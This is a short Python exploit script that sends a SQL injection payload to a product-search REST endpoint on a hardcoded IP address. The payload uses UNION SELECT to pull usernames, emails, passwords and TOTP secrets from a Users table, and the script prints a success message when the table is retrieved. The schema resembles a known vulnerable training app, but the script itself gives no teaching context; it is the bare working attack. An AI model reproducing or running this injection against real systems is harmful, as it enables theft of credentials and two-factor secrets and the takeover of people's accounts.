import requests

class UserCredentials:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def db_drop(self):
        endpoint = f"{self.base_url}/rest/products/search"
        
        payload = {
            "q": "banana')) UNION SELECT username, email, password, totpSecret, 5, 6, 7, 8, 9 FROM Users--"
        }
        
        try:
            response = self.session.get(endpoint, params=payload, headers=self.headers)
            
            if response.status_code == 200:
                print("Success ! User Credentials table has been retrieve.")
                return response.text
            else:
                print(f"Fail with http code {response.status_code}.")
                return f"Fail with http code {response.status_code}."
        except Exception as e:
            print(f"An error as occured : {e}")

def main():
    base_url = "http://45.76.47.218:3000"
    exploit = UserCredentials(base_url)
    exploit.db_drop()

if __name__ == "__main__":
    main()
